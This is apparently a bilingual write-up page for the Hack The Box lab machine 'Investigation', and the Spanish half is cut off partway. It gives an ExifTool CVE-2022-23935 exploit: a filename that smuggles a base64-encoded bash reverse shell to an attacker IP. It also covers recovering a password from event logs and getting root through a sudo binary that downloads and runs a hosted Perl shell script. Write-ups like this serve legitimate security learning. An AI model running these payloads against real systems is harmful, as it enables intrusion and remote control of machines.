@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>investigation | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">investigation</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a web application at <code>eforenzics.htb</code> that allowed uploading images for metadata analysis using ExifTool version 12.37, which is vulnerable to CVE-2022-23935. This vulnerability permits command injection through improper sanitization of pipe characters in filenames. By crafting a malicious filename ending with a pipe symbol, I was able to execute arbitrary commands and obtain a reverse shell as the <code>www-data</code> user. During enumeration, I discovered a Microsoft Outlook message file (<code>.msg</code>) belonging to user <code>smorton</code>, which contained an attached ZIP file with Windows Event Log files. After extracting and analyzing the event logs, particularly failed login attempts (Event ID 4625), I found cleartext credentials accidentally entered as a username. These credentials were valid for SSH access as <code>smorton</code>, granting user-level access. For privilege escalation, the user had sudo permissions to execute a custom binary located at <code>/usr/bin/binary</code>. Through reverse engineering with Ghidra, I discovered the binary performed several checks and then used curl to download a file from a user-provided URL, executed it as a Perl script with root privileges, and immediately deleted it. By hosting a malicious Perl script that spawned a shell and providing the correct hardcoded validation string, I was able to execute code as root and complete the machine.</p>
+                    <p><strong>Technologies/Exploits:</strong> ExifTool CVE-2022-23935 command injection, Microsoft Outlook message file extraction (.msg to .eml conversion), Windows Event Log analysis (EVTX format), binary reverse engineering, sudo privilege abuse through custom binary exploitation.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin with an nmap scan to identify open ports and running services on the target machine:</p>
+                <p><img src="./media/image1.png" alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 80" /></p>
+                
+                <p>The scan reveals SSH on port 22 and an HTTP server on port 80. I add <code>eforenzics.htb</code> to my <code>/etc/hosts</code> file to resolve the domain properly.</p>
+                
+                <h2>Web Application Enumeration</h2>
+                <p>Navigating to the web application, the most interesting functionality appears to be an image upload feature for forensic analysis:</p>
+                <p><img src="./media/image3.png" alt="Web interface showing the image upload functionality for digital forensics analysis" /></p>
+                
+                <p>Running <code>whatweb</code> provides additional information about the target:</p>
+                <pre><code class="language-plaintext">http://eforenzics.htb [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.197], JQuery[3.4.1], Meta-Author[eForenzics], Script, Title[eForenzics - Premier Digital Forensics], UncommonHeaders[upgrade]</code></pre>
+                
+                <p>Some interesting observations from this output:</p>
+                <ul>
+                    <li>Apache version 2.4.41 from 2019, which might have known vulnerabilities</li>
+                    <li>An uncommon <code>Upgrade: h2</code> header, indicating HTTP/2 support</li>
+                    <li>The application is built with Bootstrap and jQuery</li>
+                </ul>
+                
+                <h2>ExifTool Version Discovery and Vulnerability Research</h2>
+                <p>When I upload an image to the analysis functionality, the application provides a link to view the extracted metadata:</p>
+                <p><img src="./media/image2.png" alt="ExifTool output showing metadata extraction results and version 12.37" /></p>
+                
+                <p>The output reveals that the application is using <strong>ExifTool version 12.37</strong> to process uploaded images. After researching this version, I discover it's vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23935">CVE-2022-23935</a>, a critical command injection vulnerability.</p>
+                
+                <h3>Understanding CVE-2022-23935</h3>
+                <p>This vulnerability exists because ExifTool 12.37 does not properly sanitize pipe (<code>|</code>) characters at the end of filenames. When a filename ends with a pipe symbol, ExifTool interprets it as a shell command to execute, allowing arbitrary command injection. This is particularly dangerous when combined with a web application that processes user-uploaded files.</p>
+                
+                <h2>Initial Access - Exploiting ExifTool Command Injection</h2>
+                <p>After examining several proof-of-concept exploits, I create a minimal exploit script to obtain a reverse shell. The exploit works by embedding a base64-encoded reverse shell payload in the filename followed by a pipe symbol:</p>
+                
+                <pre><code class="language-bash">ATTACKER_IP="10.10.16.2"
+ATTACKER_PORT="443"
+PAYLOAD="/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"
+ENCODED=$(echo -n "$PAYLOAD" | base64)
+FILENAME="echo $ENCODED | base64 -d | bash |"
+echo "/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/yQALCAABAAEBAREA/8wABgAQEAX/2gAIAQEAAD8A0s8g/9k=" | base64 -d > "$FILENAME"</code></pre>
+                
+                <p>The script creates a minimal valid JPEG file with a malicious filename. When ExifTool processes this file, it:</p>
+                <ol>
+                    <li>Decodes the filename which ends with a pipe symbol</li>
+                    <li>Executes the command before the pipe: decoding the base64 payload</li>
+                    <li>Runs the decoded bash reverse shell command</li>
+                </ol>
+                
+                <p>I set up a netcat listener to catch the reverse shell:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+                
+                <p>After uploading the malicious image file to the web application, I successfully receive a connection as the <code>www-data</code> user.</p>
+                
+                <h2>Post-Exploitation Enumeration - Discovering smorton's Files</h2>
+                <p>During enumeration, I check the <code>/home</code> directory and discover a user named <code>smorton</code>. Searching for files owned by this user reveals an interesting file:</p>
+                
+                <pre><code class="language-bash">find / -user smorton 2>/dev/null</code></pre>
+                
+                <p>The search returns:</p>
+                <pre><code class="language-plaintext">/home/smorton
+/usr/local/investigation/Windows Event Logs for Analysis.msg</code></pre>
+                
+                <p>Checking the file type:</p>
+                <pre><code class="language-bash">file 'Windows Event Logs for Analysis.msg'</code></pre>
+                
+                <p>Output:</p>
+                <pre><code class="language-plaintext">Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook Message</code></pre>
+                
+                <p>This is a Microsoft Outlook message file, which could contain valuable information.</p>
+                
+                <h2>Extracting and Analyzing the Outlook Message</h2>
+                <p>I transfer the <code>.msg</code> file to my attacking machine for analysis. To properly extract its contents, I install the necessary tools:</p>
+                
+                <pre><code class="language-bash">sudo apt install libemail-outlook-message-perl</code></pre>
+                
+                <p>This package includes <code>msgconvert</code>, which converts Outlook <code>.msg</code> files to the more standard <code>.eml</code> format:</p>
+                
+                <pre><code class="language-bash">msgconvert 'Windows Event Logs for Analysis.msg'</code></pre>
+                
+                <p>I open the converted message using LibreOffice's email viewer:</p>
+                <pre><code class="language-bash">xdg-open 'Windows Event Logs for Analysis.eml'</code></pre>
+                
+                <p>The email contains the following message:</p>
+                <blockquote>
+                    <p><strong>Hi Steve,</strong></p>
+                    <p>Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I'm concerned that they are moving data on to production without following our data transfer procedures.</p>
+                    <p><strong>Regards,<br>Tom</strong></p>
+                </blockquote>
+                
+                <p>More importantly, the email has a ZIP file attached containing Windows Event Logs.</p>
+                
+                <h3>Extracting the ZIP Attachment</h3>
+                <p>To extract the attachment from the <code>.eml</code> file, I use the <code>munpack</code> utility from the <code>mpack</code> package:</p>
+                
+                <pre><code class="language-bash">sudo apt install mpack
+munpack 'Windows Event Logs for Analysis.eml'</code></pre>
+                
+                <p>The tool extracts:</p>
+                <pre><code class="language-plaintext">part1 (application/rtf)
+evtx-logs.zip (application/octet-stream)</code></pre>
+                
+                <p>Unzipping the archive reveals a Windows Event Log file:</p>
+                <pre><code class="language-bash">file security.evtx</code></pre>
+                
+                <p>Output:</p>
+                <pre><code class="language-plaintext">security.evtx: MS Windows 10-11 Event Log, version 3.2, 238 chunks (no. 237 in use), next record no. 20013</code></pre>
+                
+                <h2>Analyzing Windows Event Logs - Credential Discovery</h2>
+                <p>To analyze the EVTX file on Linux, I install the Python EVTX parsing library:</p>
+                <pre><code class="language-bash">sudo apt install python3-evtx</code></pre>
+                
+                <p>I convert the binary event log to XML format for easier analysis:</p>
+                <pre><code class="language-bash">evtx_dump.py security.evtx > security.xml</code></pre>
+                
+                <p>This process takes some time but produces a detailed XML file with all event log entries.</p>
+                
+                <h3>Searching for Failed Login Attempts</h3>
+                <p>In Windows Event Logs, failed login attempts are recorded with Event ID 4625. These logs often contain valuable information, including cases where users accidentally type their password in the username field. I search the XML file for these events:</p>
+                
+                <pre><code class="language-bash">grep -i "EventID.*4625" security.xml</code></pre>
+                
+                <p>The search returns only 13 matches, making manual review feasible. Examining the context around these events, I discover a suspicious entry:</p>
+                
+                <pre><code class="language-xml">&lt;EventID Qualifiers=""&gt;4625&lt;/EventID&gt;
+&lt;Version&gt;0&lt;/Version&gt;
+&lt;Level&gt;0&lt;/Level&gt;
+&lt;Task&gt;12544&lt;/Task&gt;
+&lt;Opcode&gt;0&lt;/Opcode&gt;
+&lt;Keywords&gt;0x8010000000000000&lt;/Keywords&gt;
+&lt;TimeCreated SystemTime="2022-08-01 19:15:15.374769"&gt;&lt;/TimeCreated&gt;
+&lt;EventRecordID&gt;11373331&lt;/EventRecordID&gt;
+&lt;Correlation ActivityID="{6a946884-a5bc-0001-d968-946abca5d801}" RelatedActivityID=""&gt;&lt;/Correlation&gt;
+&lt;Execution ProcessID="628" ThreadID="6800"&gt;&lt;/Execution&gt;
+&lt;Channel&gt;Security&lt;/Channel&gt;
+&lt;Computer&gt;eForenzics-DI&lt;/Computer&gt;
+&lt;Security UserID=""&gt;&lt;/Security&gt;
+&lt;/System&gt;
+&lt;EventData&gt;
+&lt;Data Name="SubjectUserSid"&gt;S-1-5-18&lt;/Data&gt;
+&lt;Data Name="SubjectUserName"&gt;EFORENZICS-DI$&lt;/Data&gt;
+&lt;Data Name="SubjectDomainName"&gt;WORKGROUP&lt;/Data&gt;
+&lt;Data Name="SubjectLogonId"&gt;0x00000000000003e7&lt;/Data&gt;
+&lt;Data Name="TargetUserSid"&gt;S-1-0-0&lt;/Data&gt;
+&lt;Data Name="TargetUserName"&gt;Def@ultf0r3nz!csPa$$&lt;/Data&gt;</code></pre>
+                
+                <p>The <code>TargetUserName</code> field contains what appears to be a password rather than a username: <code>Def@ultf0r3nz!csPa$$</code>. This is a classic mistake where a user accidentally entered their password in the username field during a failed login attempt.</p>
+                
+                <h2>SSH Access as smorton</h2>
+                <p>I test these credentials via SSH with the user <code>smorton</code>:</p>
+                
+                <pre><code class="language-bash">ssh smorton@10.10.11.197</code></pre>
+                
+                <p>The credentials are valid, granting me SSH access as <code>smorton</code>. I can now retrieve the user flag.</p>
+                
+                <h2>Privilege Escalation - Analyzing Sudo Permissions</h2>
+                <p>After gaining user access, I check what sudo privileges <code>smorton</code> has:</p>
+                
+                <pre><code class="language-bash">sudo -l</code></pre>
+                
+                <p>Output:</p>
+                <pre><code class="language-plaintext">Matching Defaults entries for smorton on investigation:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User smorton may run the following commands on investigation:
+    (root) NOPASSWD: /usr/bin/binary</code></pre>
+                
+                <p>The user can execute <code>/usr/bin/binary</code> as root without a password. Running it without arguments shows:</p>
+                
+                <pre><code class="language-bash">sudo /usr/bin/binary</code></pre>
+                
+                <p>Output:</p>
+                <pre><code class="language-plaintext">Exiting...</code></pre>
+                
+                <p>The binary requires specific arguments. I transfer it to my machine for reverse engineering with Ghidra.</p>
+                
+                <h2>Binary Analysis with Ghidra</h2>
+                <p>After analyzing the binary in Ghidra, I identify several key validation checks and the main functionality.</p>
+                
+                <h3>Validation Check 1: Argument Count</h3>
+                <p>The binary expects exactly 3 arguments (including the binary name itself):</p>
+                
+                <pre><code class="language-c">if (param_1 != 3) {
+    puts("Exiting... ");
+    exit(0);
+}</code></pre>
+                
+                <h3>Validation Check 2: Root Privileges</h3>
+                <p>The binary must be executed with root privileges (UID 0):</p>
+                
+                <pre><code class="language-c">_Var1 = getuid();
+if (_Var1 != 0) {
+    puts("Exiting... ");
+    exit(0);
+}</code></pre>
+                
+                <h3>Validation Check 3: Hardcoded String</h3>
+                <p>The third argument must be exactly the string <code>lDnxUysaQn</code>:</p>
+                
+                <pre><code class="language-c">iVar2 = strcmp(*(char **)(param_2 + 0x10), "lDnxUysaQn");
+if (iVar2 != 0) {
+    puts("Exiting... ");
+    exit(0);
+}</code></pre>
+                
+                <h3>Main Functionality: Download and Execute</h3>
+                <p>After passing all validation checks, the binary:</p>
+                <ol>
+                    <li>Opens a file named <code>lDnxUysaQn</code> for writing</li>
+                    <li>Uses curl to download content from a user-provided URL (second argument)</li>
+                    <li>Saves the downloaded content to the file</li>
+                    <li>Executes the file as a Perl script with root privileges</li>
+                    <li>Deletes the file afterwards</li>
+                </ol>
+                
+                <p>The relevant decompiled code:</p>
+                
+                <pre><code class="language-c">puts("Running... ");
+__stream = fopen(*(char **)(param_2 + 0x10), "wb");
+uVar3 = curl_easy_init();
+curl_easy_setopt(uVar3, 0x2712, *(undefined8 *)(param_2 + 8));
+curl_easy_setopt(uVar3, 0x2711, __stream);
+curl_easy_setopt(uVar3, 0x2d, 1);
+iVar2 = curl_easy_perform(uVar3);
+
+if (iVar2 == 0) {
+    iVar2 = snprintf((char *)0x0, 0, "perl ./%s", __s);
+    __s_00 = (char *)malloc((long)iVar2 + 1);
+    snprintf(__s_00, (long)iVar2 + 1, "perl ./%s", __s);
+    fclose(__stream);
+    curl_easy_cleanup(uVar3);
+    setuid(0);
+    system(__s_00);
+    system("rm -f ./lDnxUysaQn");
+}</code></pre>
+                
+                <h2>Exploiting the Binary for Root Access</h2>
+                <p>Understanding the binary's behavior, I can now exploit it to gain root access. The attack strategy is:</p>
+                <ol>
+                    <li>Create a malicious Perl script that spawns a root shell</li>
+                    <li>Host the script on my attacking machine</li>
+                    <li>Execute the binary with sudo, providing my server URL and the hardcoded validation string</li>
+                    <li>The binary will download and execute my Perl script as root</li>
+                </ol>
+                
+                <h3>Creating the Malicious Perl Script</h3>
+                <p>I create a simple Perl script that executes a shell:</p>
+                
+                <pre><code class="language-perl">exec "/bin/sh";</code></pre>
+                
+                <p>I save this as <code>xd.pl</code> and start a Python HTTP server to host it:</p>
+                
+                <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
+                
+                <h3>Executing the Exploit</h3>
+                <p>On the target machine, I execute the binary with the correct arguments:</p>
+                
+                <pre><code class="language-bash">sudo /usr/bin/binary http://10.10.16.2:8000/xd.pl lDnxUysaQn</code></pre>
+                
+                <p>The binary outputs:</p>
+                <pre><code class="language-plaintext">Running...</code></pre>
+                
+                <p>And I receive a root shell:</p>
+                <pre><code class="language-bash"># whoami
+root</code></pre>
+                
+                <p>My Python HTTP server confirms the download:</p>
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.197 - - "GET /xd.pl HTTP/1.1" 200 -</code></pre>
+                
+                <p>With root access, I can retrieve the root flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación web en <code>eforenzics.htb</code> que permitía subir imágenes para análisis de metadatos usando ExifTool versión 12.37, vulnerable a CVE-2022-23935. Esta vulnerabilidad permite inyección de comandos mediante sanitización inadecuada de caracteres pipe en nombres de archivo. Creando un nombre de archivo malicioso terminado en pipe, pude ejecutar comandos arbitrarios y obtener una reverse shell como usuario <code>www-data</code>. Durante la enumeración, descubrí un archivo de mensaje de Microsoft Outlook (<code>.msg</code>) perteneciente al usuario <code>smorton</code>, que contenía un ZIP adjunto con archivos de Event Log de Windows. Tras extraer y analizar los logs de eventos, particularmente intentos de login fallidos (Event ID 4625), encontré credenciales en texto claro introducidas accidentalmente como nombre de usuario. Estas credenciales eran válidas para acceso SSH como <code>smorton</code>, otorgando acceso a nivel de usuario. Para la escalada de privilegios, el usuario tenía permisos sudo para ejecutar un binario personalizado ubicado en <code>/usr/bin/binary</code>. Mediante ingeniería inversa con Ghidra, descubrí que el binario realizaba varias comprobaciones y luego usaba curl para descargar un archivo desde una URL proporcionada por el usuario, lo ejecutaba como script Perl con privilegios root, y lo eliminaba inmediatamente. Alojando un script Perl malicioso que generaba una shell y proporcionando la cadena de validación hardcodeada correcta, pude ejecutar código como root y completar la máquina.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> Inyección de comandos en ExifTool CVE-2022-23935, extracción de archivos de mensaje de Microsoft Outlook (conversión .msg a .eml), análisis de Windows Event Log (formato EVTX), ingeniería inversa de binarios, abuso de privilegios sudo mediante explotación de binario personalizado.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución en la máquina objetivo:</p>
+                <p><img src="./media/image1.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 80" /></p>
+                
+                <p>El escaneo revela SSH en el puerto 22 y un servidor HTTP en el puerto 80. Añado <code>eforenzics.htb</code> a mi archivo <code>/etc/hosts</code> para resolver el dominio correctamente.</p>
+                
+                <h2>Enumeración de la Aplicación Web</h2>
+                <p>Navegando a la aplicación web, la funcionalidad más interesante parece ser una característica de subida de imágenes para análisis forense:</p>
+                <p><img src="./media/image3.png" alt="Interfaz web mostrando la funcionalidad de subida de imágenes para análisis forense digital" /></p>
+                
+                <p>Ejecutando <code>whatweb</code> obtengo información adicional sobre el objetivo:</p>
+                <pre><code class="language-plaintext">http://eforenzics.htb [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.197], JQuery[3.4.1], Meta-Author[eForenzics], Script, Title[eForenzics - Premier Digital Forensics], UncommonHeaders[upgrade]</code></pre>
+                
+                <p>Algunas observaciones interesantes de esta salida:</p>
+                <ul>
+                    <li>Versión de Apache 2.4.41 de 2019, que podría tener vulnerabilidades conocidas</li>
+                    <li>Una cabecera poco común <code>Upgrade: h2</code>, indicando soporte HTTP/2</li>
+                    <li>La aplicación está construida con Bootstrap y jQuery</li>
+                </ul>
+                
+                <h2>Descubrimiento de Versión de ExifTool e Investigación de Vulnerabilidades</h2>
+                <p>Cuando subo una imagen a la funcionalidad de análisis, la aplicación proporciona un enlace para ver los metadatos extraídos:</p>
+                <p><img src="./media/image2.png" alt="Salida de ExifTool mostrando resultados de extracción de metadatos y versión 12.37" /></p>
+                
+                <p>La salida revela que la aplicación está usando <strong>ExifTool versión 12.37</strong> para procesar las imágenes subidas. Tras investigar esta versión, descubro que es vulnerable a <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23935">CVE-2022-23935</a>, una vulnerabilidad crítica de inyección de comandos.</p>
+                
+                <h3>Entendiendo CVE-2022-23935</h3>
+                <p>Esta vulnerabilidad existe porque ExifTool 12.37 no sanitiza adecuadamente los caracteres pipe (<code>|</code>) al final de los nombres de archivo. Cuando un nombre de archivo termina con un símbolo pipe, ExifTool lo interpreta como un comando shell a ejecutar, permitiendo inyección de comandos arbitrarios. Esto es particularmente peligroso cuando se combina con una aplicación web que procesa archivos subidos por usuarios.</p>
+                
+                <h2>Acceso Inicial - Explotando la Inyección de Comandos en ExifTool</h2>
+                <p>Tras examinar varias pruebas de concepto, creo un script de exploit mínimo para obtener una reverse shell. El exploit funciona embebiendo un payload de reverse shell codificado en base64 en el nombre de archivo seguido de un símbolo pipe:</p>
+                
+                <pre><code class="language-bash">ATTACKER_IP="10.10.16.2"
+ATTACKER_PORT="443"
+PAYLOAD="/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"
+ENCODED=$(echo -n "$PAYLOAD" | base64)
+FILENAME="echo $ENCODED | base64 -d | bash |"
+echo "/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/yQALCAABAAEBAREA/8wABgAQEAX/2gAIAQEAAD8A0s8g/9k=" | base64 -d > "$FILENAME"</code></pre>
+                
+                <p>El script crea un archivo JPEG mínimo válido con un nombre de archivo malicioso. Cuando ExifTool procesa este archivo:</p>
+                <ol>
+                    <li>Decodifica el nombre de archivo que termina con un símbolo pipe</li>
+                    <li>Ejecuta el comando antes del pipe: decodificando el payload en base64</li>
+                    <li>Ejecuta el comando de reverse shell en bash decodificado</li>
+                </ol>
+                
+                <p>Configuro un listener de netcat para capturar la reverse shell:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+                
+                <p>Tras subir el archivo de imagen malicioso a la aplicación web, recibo exitosamente una conexión como usuario <code>www-data</code>.</p>
+                
+                <h2>Enumeración Post-Explotación - Descubriendo Archivos de smorton</h2>
+                <p>Durante la enumeración, reviso el directorio <code>/home</code> y descubro un usuario llamado <code>smorton</code>. Buscando archivos propiedad de este usuario revela un archivo interesante:</p>
+                
+                <pre><code class="language-bash">find / -user smorton 2>/dev/null</code></pre>
+                
+                <p>La búsqueda devuelve:</p>
+                <pre><code class="language-plaintext">/home/smorton
+/usr/local/investigation/Windows Event Logs for Analysis.msg</code></pre>
+                
+                <p>Comprobando el tipo de archivo:</p>
+                <pre><code class="language-bash">file 'Windows Event Logs for Analysis.msg'</code></pre>
+                
+                <p>Salida:</p>
+                <pre><code class="language-plaintext">Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook Message</code></pre>
+                
+                <p>Este es un archivo de mensaje de Microsoft Outlook, que podría contener información valiosa.</p>
+                
+                <h2>Extrayendo y Analizando el Mensaje de Outlook</h2>
+                <p>Transfiero el archivo <code>.msg</code> a mi máquina atacante para analizarlo. Para extraer adecuadamente su contenido, instalo las herramientas necesarias:</p>
+                
+                <pre><code class="language-bash">sudo apt install libemail-outlook-message-perl</code></pre>
+                
+                <p>Este paquete incluye <code>msgconvert</code>, que convierte archivos <code>.msg</code> de Outlook al formato más estándar <code>.eml</code>:</p>
+                
+                <pre><code class="language-bash">msgconvert 'Windows Event Logs for Analysis.msg'</code></pre>
+                
+                <p>Abro el mensaje convertido usando el visor de correo de LibreOffice:</p>
+                <pre><code class="language-bash">xdg-open 'Windows Event Logs for Analysis.eml'</code></pre>
+                
+                <p>El email contiene el siguiente mensaje:</p>
+                <blockquote>
+                    <p><strong>Hola Steve,</strong></p>
+                    <p>¿Puedes revisar estos logs para ver si nuestros analistas han estado iniciando sesión en el terminal de inspección? Me preocupa que estén moviendo datos a producción sin seguir nuestros procedimientos de transferencia de datos.</p>
+                    <p><strong>Saludos,<br>Tom</strong></p>
+                </blockquote>
+                
+                <p>Más importante aún, el email tiene un archivo ZIP adjunto que contiene Windows Event Logs.</p>
+                
+                <h3>Extrayendo el Adjunto ZIP</h3>
+                <p>Para extraer el adjunto del archivo <code>.eml</code>, uso la utilidad <code>munpack</code> del paquete <code>mpack</code>:</p>
+                
+                <pre><code class="language-bash">sudo apt install mpack
+munpack 'Windows Event Logs for Analysis.eml'</code></pre>
+                
+                <p>La herramienta extrae:</p>
+                <pre><code class="language-plaintext">part1 (application/rtf)
+evtx-logs.zip (application/octet-stream)</code></pre>
+                
+                <p>Descomprimiendo el archivo revela un archivo de Event Log de Windows:</p>
+                <pre><code class="language-bash">file security.evtx</code></pre>
+                
+                <p>Salida:</p>
+                <pre><code class="language-plaintext">security.evtx: MS Windows 10-11 Event Log, version 3.2, 238 chunks (no. 237 in use), next record no. 20013</code></pre>
+                
+                <h2>Analizando Windows Event Logs - Descubrimiento de Credenciales</h2>
+                <p>Para analizar el archivo EVTX en Linux, instalo la librería de parsing EVTX de Python:</p>
+                <pre><code class="language-bash">sudo apt install python3-evtx</code></pre>
+                
+                <p>Convierto el log de eventos binario a formato XML para un análisis más fácil:</p>
+                <pre><code class="language-bash">evtx_dump.py security.evtx > security.xml</code></pre>
+                
+                <p>Este proceso tarda un tiempo pero produce un archivo XML detallado con todas las entradas del log de eventos.</p>
+                
+                <h3>Buscando Intentos de Login Fallidos</h3>
+                <p>En los Windows Event Logs, los intentos de login fallidos se registran con Event ID 4625. Estos logs frecuentemente contienen información valiosa, incluyendo casos donde los usuarios accidentalmente escriben su contraseña en el campo de nombre de usuario. Busco estos eventos en el archivo XML:</p>
+                
+                <pre><code class="language-bash">grep -i "EventID.*4625" security.xml</code></pre>
+                
+                <p>La búsqueda devuelve solo 13 coincidencias, haciendo factible una revisión manual. Examinando el contexto alrededor de estos eventos, descubro una entrada sospechosa:</p>
+                
+                <pre><code class="language-xml">&lt;EventID Qualifiers=""&gt;4625&lt;/EventID&gt;
+&lt;Version&gt;0&lt;/Version&gt;
+&lt;Level&gt;0&lt;/Level&gt;
+&lt;Task&gt;12544&lt;/Task&gt;
+&lt;Opcode&gt;0&lt;/Opcode&gt;
+&lt;Keywords&gt;0x8010000000000000&lt;/Keywords&gt;
+&lt;TimeCreated SystemTime="2022-08-01 19:15:15.374769"&gt;&lt;/TimeCreated&gt;
+&lt;EventRecordID&gt;11373331&lt;/EventRecordID&gt;
+&lt;Correlation ActivityID="{6a946884-a5bc-0001-d968-946abca5d801}" RelatedActivityID=""&gt;&lt;/Correlation&gt;
+&lt;Execution ProcessID="628" ThreadID="6800"&gt;&lt;/Execution&gt;
+&lt;Channel&gt;Security&lt;/Channel&gt;
+&lt;Computer&gt;eForenzics-DI&lt;/Computer&gt;
+&lt;Security UserID=""&gt;&lt;/Security&gt;
+&lt;/System&gt;
+&lt;EventData&gt;
+&lt;Data Name="SubjectUserSid"&gt;S-1-5-18&lt;/Data&gt;
+&lt;Data Name="SubjectUserName"&gt;EFORENZICS-DI$&lt;/Data&gt;
+&lt;Data Name="SubjectDomainName"&gt;WORKGROUP&lt;/Data&gt;
+&lt;Data Name="SubjectLogonId"&gt;0x00000000000003e7&lt;/Data&gt;
+&lt;Data Name="TargetUserSid"&gt;S-1-0-0&lt;/Data&gt;
+&lt;Data Name="TargetUserName"&gt;Def@ultf0r3nz!csPa$$&lt;/Data&gt;</code></pre>
+                
+                <p>El campo <code>TargetUserName</code> contiene lo que parece ser una contraseña en lugar de un nombre de usuario: <code>Def@ultf0r3nz!csPa$$</code>. Este es un error clásico donde un usuario introdujo accidentalmente su contraseña en el campo de nombre de usuario durante un intento de login fallido.</p>
+                
+                <h2>Acceso SSH como smorton</h2>
+                <p>Pruebo estas credenciales vía SSH con el usuario <code>smorton</code>:</p>
+                
+                <pre><code class="language-bash">ssh smorton@10.10.11.197</code></pre>
+                
+                <p>Las credenciales son válidas, otorgándome acceso SSH como <code>smorton</code>. Ahora puedo recuperar la flag de usuario.</p>
+                
+                <h2>Escalada de Privilegios - Analizando Permisos Sudo</h2>
+                <p>Tras obtener acceso de usuario, compruebo qué privilegios sudo tiene <code>smorton</code>:</p>
+                
+                <pre><code class="language-bash">sudo -l</code></pre>
+                
+                <p>Salida:</p>
+                <pre><code class="language-plaintext">Matching Defaults entries for smorton on investigation:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User smorton may run the following commands on investigation:
+    (root) NOPASSWD: /usr/bin/binary</code></pre>
+                
+                <p>El usuario puede ejecutar <code>/usr/bin/binary</code> como root sin contraseña. Ejecutándolo sin argumentos muestra:</p>
+                
+                <pre><code class="language-bash">sudo /usr/bin/binary</code></pre>
+                
+                <p>Salida:</p>
+                <pre><code class="language-plaintext">Exiting...</code></pre>
+                
+                <p>El binario requiere argumentos específicos. Lo transfiero a mi máquina para ingeniería inversa con Ghidra.</p>
+                
+                <h2>Análisis del Binario con Ghidra</h2>
+                <p>Tras analizar el binario en Ghidra, identifico varias comprobaciones de validación clave y la funcionalidad principal.</p>
+                
+                <h3>Comprobación de Validación 1: Recuento de Argumentos</h3>
+                <p>El binario espera exactamente 3 argumentos (incluyendo el nombre del binario):</p>
+                
+                <pre><code class="language-c">if (param_1 != 3) {
+    puts("Exiting... ");
+    exit(0);
+}</code></pre>
+                
+                <h3>Comprobación de Validación 2: Privilegios Root</h3>
+                <p>El binario debe ejecutarse con privilegios root (UID 0):</p>
+                
+                <pre><code class="language-c">_Var1 = getuid();
+if (_Var1 != 0) {
+    puts("Exiting... ");
+    exit(0);
+}</code></pre>
+                
+                <h3>Comprobación de Validación 3: Cadena Hardcodeada</h3>
+                <p>El tercer argumento debe ser exactamente la cadena <code>lDnxUysaQn</code>:</p>
+                
